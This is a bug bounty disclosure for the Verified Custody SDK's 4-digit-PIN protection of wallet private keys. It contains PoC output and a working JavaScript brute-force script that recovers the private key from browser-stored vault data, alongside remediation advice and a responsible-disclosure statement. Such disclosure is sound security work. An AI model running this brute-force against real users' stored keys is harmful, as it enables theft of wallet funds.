# 🚨 CRITICAL VULNERABILITY: Private Key Extraction via PIN Brute-Force

## DoraHacks Bug Bounty Submission
**Verified Network Christmas Challenge**

---

## ⚡ Quick Summary

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **Component** | `@verified-network/verified-custody` |
| **Version** | 0.4.9 |
| **Attack Time** | < 2 seconds |
| **SDK Function** | `encryptString` / `decryptString` |

---

## 📋 Vulnerability Description

The Verified Custody SDK protects private keys using only a **4-digit PIN** encrypted with AES. This provides only **10,000 possible combinations**, allowing an attacker to brute-force the PIN and extract the raw private key in under 2 seconds.

### Root Cause
1. PIN is hashed using `encodeBytes32String()` from ethers.js
2. Hashed PIN is used directly as AES encryption key
3. No key stretching, rate limiting, or hardware-backed protection
4. Encrypted keys stored in accessible browser storage

---

## 🎯 Proof of Concept

### Test Environment
- Node.js v22.18.0
- @verified-network/verified-custody@0.4.9
- ethers@6.x

### PoC Results
```
============================================================
  VERIFIED CUSTODY SDK - SECURITY ANALYSIS PoC
============================================================

🚨 PIN BRUTE-FORCE ATTACK SIMULATION

Target: U2FsdGVkX1/pCvdNKSMmvfpgh7jfL5ms8BoW/Trbv+A3PoLkmn...
Expected decrypted length: 64

Starting brute-force...

Progress: 0/9999 (0.0%)
Progress: 1000/9999 (10.0%)

🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯

✅ PIN FOUND!

PIN: 1234
Private Key: d7779207de8c45c4a1d65f1f30ba794bf4f3ea648cf55fc2e397397d3e271c54
Attempts: 1235
Time: 249ms (0.25s)
Speed: 4960 attempts/sec

🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯🎯

🔐 Cracked key matches original: ✅ YES
```

### Attack Metrics
| Metric | Value |
|--------|-------|
| Total PIN Space | 10,000 |
| Attack Speed | 4,960 attempts/sec |
| Worst-Case Time | ~2.0 seconds |
| Average Time | ~1.0 second |
| Best-Case Time | < 100ms |

---

## 📜 Vulnerable Code Path

### 1. PIN Encryption (index.mjs)
```javascript
// From SDK source - PIN is used with encodeBytes32String
const hashedPinBytes32 = encodeBytes32String(pin);  // "1234" → "0x31323334000..."
const encrypted = encryptString(privateKey, hashedPinBytes32);
```

### 2. AES Encryption (crypto-js)
```javascript
// Uses crypto-js AES - no key stretching
const encryptString = (text, secretKey) => {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
};
```

### 3. Storage (Browser/Extension)
```javascript
// Keys stored in accessible storage
await chrome.storage.local.set({
    myVault: JSON.stringify({
        pk: encryptedPk,  // ← Vulnerable encrypted key
        ...
    })
});
```

---

## 🔥 Attack Scenario

### Prerequisites
- Access to user's browser storage (localStorage/chrome.storage)
- OR intercepted encrypted private key from network

### Steps
1. Extract encrypted `pk` value from `myVault` storage entry
2. Run brute-force loop for all 10,000 4-digit PINs
3. Test each PIN by attempting decryption
4. Valid PIN produces 64-char hex private key
5. Import recovered private key to any wallet
6. **Full wallet access achieved**

### Attack Script
```javascript
const { decryptString } = require('@verified-network/verified-custody');
const { encodeBytes32String } = require('ethers');

async function bruteForcePIN(encryptedPK) {
    for (let pin = 0; pin <= 9999; pin++) {
        const pinStr = pin.toString().padStart(4, '0');
        const hashedPin = encodeBytes32String(pinStr);
        
        try {
            const decrypted = decryptString(encryptedPK, hashedPin);
            if (decrypted && /^[0-9a-fA-F]{64}$/.test(decrypted)) {
                return { pin: pinStr, privateKey: decrypted };
            }
        } catch (e) { continue; }
    }
}
```

---

## 💰 Impact Assessment

### Affected Assets
- All user private keys protected by 4-digit PIN
- All funds in associated wallets
- All on-chain assets linked to recovered addresses

### Attack Vectors
1. **Malicious Extension** - Read chrome.storage
2. **XSS Attack** - Access localStorage
3. **Physical Access** - Export browser data
4. **Malware** - Monitor storage APIs

### Severity Justification
- **Confidentiality: HIGH** - Complete private key exposure
- **Integrity: HIGH** - Attacker can sign any transaction
- **Availability: LOW** - No direct denial of service

---

## ✅ Remediation Recommendations

### Immediate
1. **Increase PIN length** to 6+ digits (1M+ combinations)
2. **Add PBKDF2** with high iteration count (300,000+)
3. **Implement rate limiting** on decryption attempts

### Long-Term
1. **Use hardware-backed keys** (WebAuthn/Passkeys)
2. **Implement Secure Enclave** storage where available
3. **Add biometric verification** layer
4. **Consider MPC-based** key protection

### Example Fix
```javascript
// BEFORE (vulnerable)
const encrypted = encryptString(pk, encodeBytes32String(pin));

// AFTER (secure)
const salt = crypto.getRandomValues(new Uint8Array(32));
const key = await crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt, iterations: 310000, hash: 'SHA-256' },
    await crypto.subtle.importKey('raw', pinBuffer, 'PBKDF2', false, ['deriveKey']),
    { name: 'AES-GCM', length: 256 }, false, ['encrypt']
);
const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv: crypto.getRandomValues(new Uint8Array(12)) },
    key, pkBuffer
);
```

---

## 📁 Submitted Files

1. `SECURITY_AUDIT_REPORT.md` - Full technical analysis
2. `poc-pin-bruteforce.js` - Working PoC exploit
3. `DORAHACKS_SUBMISSION.md` - This document

---

## 👤 Researcher

**GitHub:** 0xsupremedev  
**Email:** 0xsupremedev@gmail.com

---

## 📜 Disclosure Timeline

| Date | Event |
|------|-------|
| 2025-12-26 | Vulnerability discovered |
| 2025-12-26 | PoC developed and verified |
| 2025-12-26 | Report submitted to DoraHacks |

---

## ⚠️ Responsible Disclosure

This vulnerability was disclosed through the official Verified Network Bug Bounty program via DoraHacks. No live user funds were accessed during this research. All testing was performed against locally generated test keys.
